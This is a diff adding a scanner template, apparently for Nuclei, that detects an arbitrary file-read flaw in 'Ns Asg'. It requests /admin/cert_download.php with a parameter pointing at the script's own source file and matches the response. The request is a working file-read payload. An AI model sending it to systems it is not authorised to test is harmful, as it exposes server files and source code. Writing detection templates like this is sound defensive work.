@@ -1,0 +1,22 @@
+id: poc-yaml-ns-asg-file-read
+info:
+  name: Ns Asg File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-read
+  description: |
+    Detects potential file read vulnerabilities in Ns Asg by downloading a certificate file.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "$certfile"
+          - "application/pdf"
